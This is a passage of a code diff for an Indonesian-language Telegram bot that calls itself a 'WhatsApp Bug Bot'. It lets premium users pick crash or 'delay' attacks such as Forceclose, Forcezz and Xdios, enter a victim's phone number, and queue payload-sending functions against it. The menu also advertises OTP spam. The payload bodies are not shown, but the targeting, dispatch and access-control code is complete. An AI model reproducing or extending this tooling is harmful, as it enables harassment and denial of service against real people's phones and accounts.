     getMessage: async () => ({ conversation: "Apophis" }),
   });
 
+  global.sock = sock;
+
   sock.ev.on("creds.update", saveCreds);
   store.bind(sock.ev);
 
@@ -305,10 +551,9 @@ async function startSesi() {
 ⌑ Type         : Sudah Terhubung
 ╘—————————————————═⬡
 </pre></blockquote>`;
-        bot.telegram
-          .editMessageCaption(lastPairingMessage.chatId, lastPairingMessage.messageId, undefined, txt, { parse_mode: "HTML" })
-          .catch(() => {});
+        bot.telegram.editMessageCaption(lastPairingMessage.chatId, lastPairingMessage.messageId, undefined, txt, { parse_mode: "HTML" }).catch(() => {});
       }
+
       isWhatsAppConnected = true;
       console.log(chalk.bold.yellow(`
   ⬡═—⊱ SENDER ONLINE ⊰—═⬡
@@ -316,6 +561,7 @@ async function startSesi() {
   ⬡═―—―――――――――――――――――—═⬡
   `));
     }
+
     if (connection === "close") {
       const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
       console.log(chalk.red("WA terputus:"), reconnect ? "Mencoba reconnect..." : "Perlu pairing ulang.");
@@ -327,12 +573,14 @@ async function startSesi() {
 startSesi();
 
 // =================== MIDDLEWARE ===================
-const needWA = (ctx, next) => {
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender yang terhubung.");
+const checkWhatsAppConnection = (ctx, next) => {
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
   next();
 };
-const needCooldown = (ctx, next) => {
-  const id = ctx.from.id, now = Date.now();
+
+const checkCooldown = (ctx, next) => {
+  const id = ctx.from.id;
+  const now = Date.now();
   if (userCooldowns.has(id)) {
     const diff = (now - userCooldowns.get(id)) / 500;
     if (diff < cooldown) return ctx.reply(`⏳ ☇ Sabar dulu ${Math.ceil(cooldown - diff)} detik ya.`);
@@ -340,8 +588,9 @@ const needCooldown = (ctx, next) => {
   userCooldowns.set(id, now);
   next();
 };
-const needPremGroup = () => async (ctx, next) => {
-  if (ctx.chat?.type === "private") return ctx.reply("❌ Fitur ini cuma bisa di grup premium.");
+
+const premGroupOnly = () => async (ctx, next) => {
+  if (ctx.chat?.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
   if (!isPremGroup(ctx.chat.id)) {
     const t = esc(ctx.chat?.title || "Grup ini");
     return ctx.reply(`❌ ☇ <b>${t}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
@@ -349,178 +598,463 @@ const needPremGroup = () => async (ctx, next) => {
   next();
 };
 
+// =================== RICH HTML BUILDER ===================
+function buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus) {
+  return `
+<h1>⚔️ Hefaistos Hades</h1>
+<p><i>System Control • WhatsApp Bug Bot</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<p>Halo <b>${esc(userFirst)}</b> 👋 selamat datang kembali.</p>
+<h2>📊 Status System</h2>
+<table>
+  <tr><th>Komponen</th><th>Status</th></tr>
+  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
+  <tr><td>Runtime</td><td><code>${runtimeStatus}</code></td></tr>
+  <tr><td>Memory</td><td><code>${memoryStatus}</code></td></tr>
+  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
+</table>
+<hr/>
+<h2>✨ Fitur Utama</h2>
+<checklist>
+  <li checked>Bug Delay &amp; Crash</li>
+  <li checked>Pairing WhatsApp</li>
+  <li checked>Premium Group System</li>
+  <li checked>Auto Update Script</li>
+  <li checked>Game Tic Tac Toe &amp; Suit</li>
+</checklist>
+<hr/>
+<details>
+  <summary>📌 Info Developer</summary>
+  <p>Developer : <b>@shinracery</b></p>
+  <p>Version   : <b>New</b></p>
+  <p>Language  : <b>JavaScript</b></p>
+</details>
+<p>Tekan tombol <b>Open Menu</b> di bawah buat mulai.</p>
+`.trim();
+}
+
+const START_KEYBOARD = [[
+  { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
+]];
+
+const SETTING_KEYBOARD = [
+  [
+    { text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5463167176099780578" },
+    { text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id: "5267231489610760977" },
+  ],
+  [
+    { text: "𝐁𝐮𝐠 𝐏𝐢𝐥𝐢𝐡", callback_data: "/bug_pick_menu", style: "primary", icon_custom_emoji_id: "5267231489610760977" },
+  ],
+];
+
+const BUG_KEYBOARD = [
+  [
+    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
+    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
+  ],
+];
+
+const BUG_PICK_KEYBOARD = [
+  [
+    { text: "Forceclose", callback_data: "bug_pick_forceclose", style: "danger" },
+    { text: "Delayhard",  callback_data: "bug_pick_delayhard",  style: "success" },
+  ],
+  [
+    { text: "Ghost",   callback_data: "bug_pick_ghost",   style: "success" },
+    { text: "Forcezz", callback_data: "bug_pick_forcezz", style: "danger" },
+  ],
+  [
+    { text: "Xdios", callback_data: "bug_pick_xdios", style: "primary" },
+  ],
+  [
+    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
+    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
+  ],
+];
+
 // =================== /start ===================
 bot.start(async (ctx) => {
-  const userId = ctx.from.id;
-  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const userId        = ctx.from.id;
+  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
   const runtimeStatus = formatRuntime();
-  const memoryStatus = formatMemory();
+  const memoryStatus  = formatMemory();
   const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
-  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
 
-  await ctx.sendChatAction("typing");
+  const html = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);
 
-  const lines = [
-    `<b>⚔️ Hefaistos Hades</b>`,
-    `<i>System Control • WhatsApp Bug Bot</i>`,
-    `━━━━━━━━━━━━━━━━━━━━`,
-    ``,
-    `Halo <b>${esc(userFirst)}</b> 👋`,
-    `Selamat datang kembali.`,
-    ``,
-    `📊 <b>STATUS SYSTEM</b>`,
-    `├ Sender  : <b>${senderStatus}</b>`,
-    `├ Runtime : <code>${runtimeStatus}</code>`,
-    `├ Memory  : <code>${memoryStatus}</code>`,
-    `└ Akses   : <b>${premiumStatus}</b>`,
-    ``,
-    `✨ <b>FITUR UTAMA</b>`,
-    `├ Bug Delay & Crash`,
-    `├ Pairing WhatsApp`,
-    `├ Premium Group System`,
-    `├ Auto Update Script`,
-    `└ Game Tic Tac Toe & Suit`,
-    ``,
-    `📌 <b>DEVELOPER</b>`,
-    `├ Name : @shinracery`,
-    `├ Ver  : New`,
-    `└ Lang : JavaScript`,
-    ``,
-    `━━━━━━━━━━━━━━━━━━━━`,
-    `Tekan tombol di bawah buat mulai.`,
-  ];
+  try {
+    await ctx.telegram.callApi("sendRichMessage", {
+      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
+    });
+  } catch (err) {
+    console.log("rich gagal, fallback ke foto:", err?.response?.description || err.message);
+    const fallback = `
+<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
+↯ Developer : @shinracery
+↯ Version   : New
+↯ Language  : JavaScript
 
-  const keyboard = [[{
-    text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮",
-    callback_data: "/setting_menu",
-    style: "success",
-    icon_custom_emoji_id: "6163328887813051603",
-  }]];
-
-  await dripSend(ctx, lines.join("\n"), {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: keyboard },
-    speed: 200,
-  });
+<blockquote>「 𝖲𝗍𝖺𝗍𝗎𝗌𝖾𝖽 」</blockquote>
+↯ Sender  : ${senderStatus}
+↯ Runtime : ${runtimeStatus}
+`.trim();
+    await ctx.replyWithPhoto(thumbnailUrl, { caption: fallback, parse_mode: "HTML", reply_markup: { inline_keyboard: START_KEYBOARD } });
+  }
 });
 
 // =================== CALLBACK: MENU UTAMA ===================
 bot.action("/start", async (ctx) => {
   await ctx.answerCbQuery();
-
-  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
+  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
   const runtimeStatus = formatRuntime();
-  const memoryStatus = formatMemory();
+  const memoryStatus  = formatMemory();
   const premiumStatus = isPremiumUser(ctx.from.id) ? "Premium" : "Free";
-  const userFirst = ctx.from.first_name || ctx.from.username || "Kak";
+  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html  = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);
 
-  const lines = [
-    `<b>⚔️ Hefaistos Hades</b>`,
-    `<i>System Control • WhatsApp Bug Bot</i>`,
-    `━━━━━━━━━━━━━━━━━━━━`,
-    ``,
-    `Halo <b>${esc(userFirst)}</b> 👋`,
-    `Selamat datang kembali.`,
-    ``,
-    `📊 <b>STATUS SYSTEM</b>`,
-    `├ Sender  : <b>${senderStatus}</b>`,
-    `├ Runtime : <code>${runtimeStatus}</code>`,
-    `├ Memory  : <code>${memoryStatus}</code>`,
-    `└ Akses   : <b>${premiumStatus}</b>`,
-    ``,
-    `📌 <b>DEVELOPER</b>`,
-    `├ Name : @shinracery`,
-    `├ Ver  : New`,
-    `└ Lang : JavaScript`,
-    ``,
-    `Tekan tombol di bawah buat lanjut.`,
-  ];
-
-  const keyboard = [[{
-    text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮",
-    callback_data: "/setting_menu",
-    style: "success",
-    icon_custom_emoji_id: "6163328887813051603",
-  }]];
-
-  await dripEdit(ctx, lines.join("\n"), {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: keyboard },
-    speed: 180,
-  });
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
+    });
+  } catch (err) {
+    console.log("edit rich gagal:", err?.response?.description || err.message);
+  }
 });
 
-// =================== BUG MENU ===================
+// =================== BUG MENU (list command) ===================
 bot.action("/bug_menu", async (ctx) => {
   await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
 
-  const lines = [
-    `🎭 <b>BUG MENU</b>`,
-    `<i>(Page 3/3)</i>`,
-    `•.¸ Hefaistos Hades ¸.•`,
-    `────────────────────`,
-    ``,
-    `<tg-emoji emoji-id="5267231489610760977">👁‍🗨</tg-emoji> 𝐈𝐍𝐈𝐓𝐈𝐀𝐋𝐈𝐙𝐄 𝐁𝐔𝐆`,
-    ``,
-    `↯ /Clown  • Delay Hard`,
-    `↯ /Deadly • Delay Medium`,
-    `↯ /Ghost  • Delay Low`,
-    `↯ /Clover • Delay Magic`,
-    `↯ /Kelzu  • Delay Level`,
-    `↯ /Vortex • Delay Duration`,
-    ``,
-    `────────────────────`,
-    `Pilih salah satu command di atas.`,
-  ];
+  const html = `
+<h2>BUG MENU</h2>
+<p><i>(Page 3/3) • Hefaistos Hades</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<h2>Delay Bug</h2>
+<ul>
+  <li>/delayhard  • Delay Hard</li>
+  <li>/ghost      • Delay Ghost</li>
+  <li>/forceclose • Force Close</li>
+  <li>/forcezz    • Force Zezz</li>
+  <li>/xdios      • Delay Xdios</li>
+</ul>
+<hr/>
+<h2>Crash Bug</h2>
+<ul>
+  <li>/bug • Pilih jenis bug dari tombol</li>
+</ul>
+`.trim();
 
-  const kbd = [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]];
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_KEYBOARD },
+    });
+  } catch (err) { console.log("bug_menu gagal:", err?.response?.description || err.message); }
+});
 
-  await dripEdit(ctx, lines.join("\n"), {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: kbd },
-    speed: 160,
+// =================== BUG PICK MENU (tombol interaktif) ===================
+bot.action("/bug_pick_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+
+  const html = `
+<h2>BUG PICK MENU</h2>
+<p><i>Pilih metode bug di bawah, lalu kirim nomor target.</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<h2>Daftar Bug</h2>
+<ul>
+  <li>Forceclose</li>
+  <li>Delayhard</li>
+  <li>Ghost</li>
+  <li>Forcezz</li>
+  <li>Xdios</li>
+</ul>
+<hr/>
+<p><i>Klik tombol di bawah buat pilih bug.</i></p>
+`.trim();
+
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_PICK_KEYBOARD },
+    });
+  } catch (err) { console.log("bug_pick_menu gagal:", err?.response?.description || err.message); }
+});
+
+// =================== PILIH BUG DARI TOMBOL ===================
+const pendingBugUser = new Map();
+
+bot.action(/^bug_pick_(.+)$/, async (ctx) => {
+  const userId  = ctx.from.id;
+  const bugName = ctx.match[1];
+
+  const label = {
+    forceclose: "Forceclose",
+    delayhard:  "Delayhard",
+    ghost:      "Ghost",
+    forcezz:    "Forcezz",
+    xdios:      "Xdios",
+  }[bugName] || bugName;
+
+  pendingBugUser.set(userId, bugName);
+  await ctx.answerCbQuery(`✅ ${label} dipilih`);
+
+  const html = `
+<h2>BUG: ${label.toUpperCase()}</h2>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<p>Sekarang kirim nomor target.</p>
+<p><b>Contoh:</b> <code>628xxxxxxxx</code></p>
+<hr/>
+<p><i>Ketik nomornya aja, langsung kirim.</i></p>
+`.trim();
+
+  const kbd = [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/bug_pick_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]];
+
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
+    });
+  } catch (err) { console.log("pick bug err:", err?.response?.description || err.message); }
+});
+
+// =================== NANGKEP NOMOR ===================
+bot.on("text", async (ctx, next) => {
+  const userId = ctx.from.id;
+  const text   = ctx.message?.text || "";
+
+  if (!pendingBugUser.has(userId)) return next();
+  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
+
+  const parts = text.trim().split(/\s+/);
+  if (parts.length !== 1) return next();
+
+  const rawNumber = parts[0];
+  const target    = formatTarget(rawNumber);
+
+  if (!target) return ctx.reply("❌ Nomor gak valid. Kirim ulang, contoh: <code>628xxxxxxxx</code>", { parse_mode: "HTML" });
+
+  const bugName = pendingBugUser.get(userId);
+  pendingBugUser.delete(userId);
+
+  const label = {
+    forceclose: "Forceclose",
+    delayhard:  "Delayhard",
+    ghost:      "Ghost",
+    forcezz:    "Forcezz",
+    xdios:      "Xdios",
+  }[bugName] || bugName;
+
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
+  await ctx.reply(`✅ Menjalankan <b>${label}</b> untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
+
+  queue.add(async () => {
+    try {
+      switch (bugName) {
+        case "forceclose":
+          await ForcloseVIDEO(sock, target); await sleep(1500);
+          await ForcloseDOC(sock, target);   await sleep(1500);
+          await ForcloseSTC(sock, target);   await sleep(1500);
+          await nativestc(sock, target);     await sleep(1500);
+          await BulV1(sock, target);
+          break;
+        case "delayhard":
+          await nativestc(sock, target); await sleep(1500);
+          await BulV1(sock, target);
+          break;
+        case "ghost":
+          await nativestc(sock, target); await sleep(1500);
+          await BulV1(sock, target);
+          break;
+        case "forcezz":
+          await ForcloseVIDEO(sock, target); await sleep(1500);
+          await ForcloseDOC(sock, target);   await sleep(1500);
+          await ForcloseSTC(sock, target);   await sleep(1500);
+          await nativestc(sock, target);     await sleep(1500);
+          await BulV1(sock, target);
+          break;
+        case "xdios":
+          await iosswipper(sock, target); await sleep(1500);
+          await catchingOs(target);
+          break;
+        default: throw new Error("Bug tidak dikenal");
+      }
+      await ctx.reply(`✅ <b>${label}</b> selesai untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
+    } catch (e) {
+      console.error("bug button err:", e.message);
+      await ctx.reply(`❌ <b>${label}</b> gagal untuk <code>${rawNumber}</code>`, { parse_mode: "HTML" });
+    }
   });
 });
 
 // =================== SETTING MENU ===================
 bot.action("/setting_menu", async (ctx) => {
   await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
 
-  const lines = [
-    `☰ <b>SYSTEM CONTROL PANEL</b>`,
-    `<i>(Page 2/3)</i>`,
-    `•.¸ 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂 ¸.•`,
-    `────────────────────`,
-    ``,
-    `☰ <b>CONNECT BOT / UPDATE</b>`,
-    `↯ /addpairing  → Add Sender`,
-    `↯ /killsession → Delete Sender`,
-    `↯ /update      → Auto Update`,
-    ``,
-    `☰ <b>OWNERS SETTINGS</b>`,
-    `↯ /addpremgrup  → Add All Member`,
-    `↯ /delpremgrup  → Remove All Member`,
-    `↯ /listpremgrup → List Group`,
-    ``,
-    `☰ <b>FUN MENU</b>`,
-    `↯ /spamotp → OTP Spam`,
-    `↯ /spotify → Cari Lagu`,
-    ``,
-    `────────────────────`,
-    `Security Mode : <b>ACTIVE</b>`,
-    `Network       : Hefaistos Hades Core`,
-  ];
+  const html = `
+<h2>☰ SYSTEM CONTROL PANEL</h2>
+<p><i>(Page 2/3) • 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<h3>☰ Connect Bot / Update</h3>
+<ul>
+  <li>/addpairing  → Add Sender</li>
+  <li>/killsession → Delete Sender</li>
+  <li>/update      → Auto Update</li>
+</ul>
+<h3>☰ Owners Settings</h3>
+<ul>
+  <li>/addpremgrup  → Add All Member</li>
+  <li>/delpremgrup  → Remove All Member</li>
+  <li>/listpremgrup → List Group</li>
+</ul>
+<h3>☰ Fun Menu</h3>
+<ul>
+  <li>/spamotp → OTP Spam</li>
+  <li>/spotify → Cari Lagu</li>
+</ul>
+<hr/>
+<p>Security Mode : <b>ACTIVE</b></p>
+<p>Network       : <b>Hefaistos Hades Core</b></p>
+`.trim();
+
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: SETTING_KEYBOARD },
+    });
+  } catch (err) { console.log("setting_menu gagal:", err?.response?.description || err.message); }
+});
+
+// =================== COMMAND MANUAL BUG ===================
+bot.command("delayhard", premGroupOnly(), async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+  const args = ctx.message.text.split(" ");
+  if (!args[1]) return ctx.reply("📌 Format: /delayhard 628xxxx");
+  const target = formatTarget(args[1]);
+  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+  await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard process mengirim for ${args[1]}`);
+  queue.add(async () => {
+    try {
+      await nativestc(sock, target); await sleep(1500);
+      await BulV1(sock, target);
+      await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard bug selesai untuk ${args[1]}`);
+    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ delayhard bug gagal for ${args[1]}`); }
+  });
+});
+
+bot.command("ghost", premGroupOnly(), async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+  const args = ctx.message.text.split(" ");
+  if (!args[1]) return ctx.reply("📌 Format: /ghost 628xxxx");
+  const target = formatTarget(args[1]);
+  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+  await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost process mengirim for ${args[1]}`);
+  queue.add(async () => {
+    try {
+      await nativestc(sock, target); await sleep(1500);
+      await BulV1(sock, target);
+      await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost bug selesai untuk ${args[1]}`);
+    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ ghost bug gagal for ${args[1]}`); }
+  });
+});
+
+bot.command("forceclose", premGroupOnly(), async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+  const args = ctx.message.text.split(" ");
+  if (!args[1]) return ctx.reply("📌 Format: /forceclose 628xxxx");
+  const target = formatTarget(args[1]);
+  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+  await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose process mengirim for ${args[1]}`);
+  queue.add(async () => {
+    try {
+      await ForcloseVIDEO(sock, target); await sleep(1500);
+      await ForcloseDOC(sock, target);   await sleep(1500);
+      await ForcloseSTC(sock, target);   await sleep(1500);
+      await nativestc(sock, target);     await sleep(1500);
+      await BulV1(sock, target);
+      await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose bug selesai untuk ${args[1]}`);
+    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ forceclose bug gagal for ${args[1]}`); }
+  });
+});
+
+bot.command("forcezz", premGroupOnly(), async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+  const args = ctx.message.text.split(" ");
+  if (!args[1]) return ctx.reply("📌 Format: /forcezz 628xxxx");
+  const target = formatTarget(args[1]);
+  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+  await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz process mengirim for ${args[1]}`);
+  queue.add(async () => {
+    try {
+      await ForcloseVIDEO(sock, target); await sleep(1500);
+      await ForcloseDOC(sock, target);   await sleep(1500);
+      await ForcloseSTC(sock, target);   await sleep(1500);
+      await nativestc(sock, target);     await sleep(1500);
+      await BulV1(sock, target);
+      await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz bug selesai untuk ${args[1]}`);
+    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ forcezz bug gagal for ${args[1]}`); }
+  });
+});
+
+bot.command("xdios", premGroupOnly(), async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+  const args = ctx.message.text.split(" ");
+  if (!args[1]) return ctx.reply("📌 Format: /xdios 628xxxx");
+  const target = formatTarget(args[1]);
+  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+  await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios process mengirim for ${args[1]}`);
+  queue.add(async () => {
+    try {
+      await iosswipper(sock, target); await sleep(1500);
+      await catchingOs(target);
+      await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios bug selesai untuk ${args[1]}`);
+    } catch (e) { await ctx.telegram.sendMessage(ctx.chat.id, `✅ xdios bug gagal for ${args[1]}`); }
+  });
+});
+
+// =================== /bug (crash) — pakai tombol ===================
+bot.command("bug", premGroupOnly(), async (ctx) => {
+  const html = `
+<h2>CRASH BUG</h2>
+<p><i>Pilih metode crash di bawah.</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<p>Klik tombol, lalu kirim nomor target.</p>
+`.trim();
 
   const kbd = [
-    [{ text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5463167176099780578" }],
-    [{ text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id: "5267231489610760977" }],
+    [{ text: "Forceclose", callback_data: "bug_pick_forceclose", style: "danger" }],
+    [{ text: "Forcezz",    callback_data: "bug_pick_forcezz",    style: "danger" }],
+    [{ text: "Xdios",      callback_data: "bug_pick_xdios",      style: "primary" }],
   ];
 
-  await dripEdit(ctx, lines.join("\n"), {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: kbd },
-    speed: 160,
-  });
+  try {
+    await ctx.telegram.callApi("sendRichMessage", {
+      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
+    });
+  } catch {
+    await ctx.replyWithPhoto(thumbnailUrl, {
+      caption: `<b>CRASH BUG</b>\n\nPilih metode di bawah.`, parse_mode: "HTML",
+      reply_markup: { inline_keyboard: kbd },
+    });
+  }
 });
 
 // =================== PAIRING ===================
@@ -530,14 +1064,11 @@ bot.command("addpairing", async (ctx) => {
   if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");
   const phone = args.replace(/[^0-9]/g, "");
   if (!phone) return ctx.reply("❌ ☇ Nomor gak valid.");
-
   try {
     if (!sock) return ctx.reply("❌ ☇ Socket belum siap.");
     if (sock.authState.creds.registered) return ctx.reply(`✅ ☇ WA udah terhubung ke ${phone}`);
-
     const code = await sock.requestPairingCode(phone, "1234GINA");
     const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
-
     const caption = `
 <blockquote><pre>
 ⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
@@ -546,26 +1077,20 @@ bot.command("addpairing", async (ctx) => {
 ⌑ Status Bot   : Belum Terhubung
 ╘═——————————————═⬡
 </pre></blockquote>`.trim();
-
     const sent = await ctx.replyWithPhoto(ThumbnailPairing, {
-      caption,
-      parse_mode: "HTML",
+      caption, parse_mode: "HTML",
       reply_markup: { inline_keyboard: [[{ text: "SALIN CODE", copy_text: { text: formatted } }]] },
     });
-
     lastPairingMessage = { chatId: ctx.chat.id, messageId: sent.message_id, phoneNumber: phone, pairingCode: formatted };
-  } catch (err) {
-    console.error("addpairing err:", err.message);
-  }
+  } catch (err) { console.error("addpairing err:", err.message); }
 });
 
-// =================== OWNER ===================
+// =================== OWNER TOOLS ===================
 bot.command("setcd", async (ctx) => {
   if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
   const s = parseInt(ctx.message.text.split(" ")[1]);
   if (isNaN(s) || s < 0) return ctx.reply("🪧 ☇ Format: /setcd 5");
-  cooldown = s;
-  saveCooldown(s);
+  cooldown = s; saveCooldown(s);
   ctx.reply(`✅ ☇ Cooldown di-set ${s} detik.`);
 });
 
@@ -579,9 +1104,7 @@ bot.command("killsession", async (ctx) => {
     if (deleted) {
       await ctx.reply("✅ ☇ Session dihapus, panel restart...");
       setTimeout(() => process.exit(1), 2000);
-    } else {
-      ctx.reply("🪧 ☇ Gak ada folder session.");
-    }
+    } else ctx.reply("🪧 ☇ Gak ada folder session.");
   } catch (err) { console.error(err); ctx.reply("❌ ☇ Gagal hapus session."); }
 });
 
@@ -589,9 +1112,7 @@ bot.command("addprem", async (ctx) => {
   if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
   const args = ctx.message.text.split(" ");
   let userId = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id.toString() : args[1];
-  if (!userId || (!ctx.message.reply_to_message && args.length < 3)) {
-    return ctx.reply("🪧 ☇ Format: /addprem 12345678 30\nAtau reply user.");
-  }
+  if (!userId || (!ctx.message.reply_to_message && args.length < 3)) return ctx.reply("🪧 ☇ Format: /addprem 12345678 30\nAtau reply user.");
   const dIdx = ctx.message.reply_to_message ? 1 : 2;
   const duration = parseInt(args[dIdx]);
   if (isNaN(duration)) return ctx.reply("🪧 ☇ Durasi harus angka (hari).");
@@ -614,8 +1135,7 @@ bot.command("approved", async (ctx) => {
   const chatId = ctx.message.text.split(" ").slice(1)[0];
   if (!chatId) return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
   if (isGroupApproved(chatId)) return ctx.reply("⚠️ Udah di-approve.");
-  approvedGroups.push(String(chatId));
-  saveApproved();
+  approvedGroups.push(String(chatId)); saveApproved();
   if (pendingGroups.has(String(chatId))) { clearTimeout(pendingGroups.get(String(chatId)).timeout); pendingGroups.delete(String(chatId)); }
